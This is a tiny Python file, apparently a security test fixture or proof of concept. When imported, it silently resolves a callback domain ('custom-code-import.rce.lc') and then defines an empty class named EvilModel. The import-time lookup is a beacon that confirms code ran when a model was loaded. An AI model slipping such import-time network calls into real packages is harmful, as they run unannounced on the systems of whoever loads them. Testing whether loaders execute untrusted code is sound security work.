import socket

try:
    socket.getaddrinfo("custom-code-import.rce.lc", 80)
except Exception:
    pass


class EvilModel:
    pass
